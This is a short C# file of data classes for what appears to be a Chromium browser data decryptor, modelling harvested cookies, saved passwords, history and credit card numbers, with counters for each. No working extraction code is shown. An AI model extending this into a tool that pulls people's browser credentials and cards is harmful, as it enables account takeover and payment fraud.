namespace Chromium_Decryptor.Modules.Classes
{
    internal class Cookies
    {
        public string HostKey { get; set; }
        public string Name { get; set; }
        public string EncryptedValue { get; set; }
    }
    internal class Passwords
    {
        public string url { get; set; }
        public string username { get; set; }
        public string password { get; set; }
    }
    internal class History
    {
        public string url { get; set; }
    }
    internal class CreditCards
    {
        public string Name { get; set; }
        public string ExpiryMonth { get; set; }
        public string ExpiryYear { get; set; }
        public string CreditCardNumber { get; set; }
    }
    internal class Total
    {
        public static int CCS = 0;
        public static int PASSWORDS = 0;
        public static int HISTORY = 0;
        public static int COOKIES = 0;
        public static int BOOKMARKS = 0;
        public static int AUTOFILLS = 0;
    }
}
